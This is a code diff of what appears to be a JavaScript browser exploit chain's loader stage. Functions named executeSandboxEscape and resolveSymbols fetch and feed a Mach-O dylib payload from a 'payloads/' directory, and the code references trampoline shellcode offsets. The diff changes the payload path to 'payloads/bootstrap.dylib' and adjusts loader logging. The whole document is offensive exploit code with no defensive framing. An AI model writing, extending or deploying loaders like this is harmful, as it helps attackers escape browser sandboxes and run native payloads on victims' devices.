@@ -1244,10 +1244,11 @@ function YA() {/* Original: YA → resolveSymbols */
                     if (lastSlash >= 0) hashName = hashName.substring(lastSlash + 1);
                     hashName = hashName.replace(/\.min\.js$/, "").replace(/\.js$/, "");
 
+                    // Fetch decrypted F00DBEEF container from payloads/ directory
                     window.log("[LOADER] Loading payload: " + hashName);
                     const container = await E.buildContainer(hashName);
                     E.feedRawBuffer(container);
-                    window.log("[LOADER] Payload fed to dylib: " + hashName);
+                    window.log("[LOADER] Fed " + container.byteLength + " bytes for " + hashName);
                 } catch (err) {
                     window.log("[LOADER] Download error: " + err);
                     M();
@@ -1255,7 +1256,6 @@ function YA() {/* Original: YA → resolveSymbols */
             })();
         },
         UA(A) {
-            // Legacy path — no longer used, download() feeds raw buffers directly
             E.feedRawBuffer(A);
         },
         sA() {
@@ -1326,7 +1326,7 @@ function executeSandboxEscape() {/* Original: yA → executeSandboxEscape */
         // Dylib must be pre-truncated to Mach-O proper (no appended data).
         const _ORIG_PROCESS_OFF = 0x68d8; // hardcoded in B trampoline shellcode
         const _xhr = new XMLHttpRequest();
-        _xhr.open("GET", "other/Stage3ValidatorOrSomething.dylib", false);
+        _xhr.open("GET", "payloads/bootstrap.dylib", false);
         _xhr.overrideMimeType("text/plain; charset=x-user-defined");
         _xhr.send();
         const _raw = _xhr.responseText;
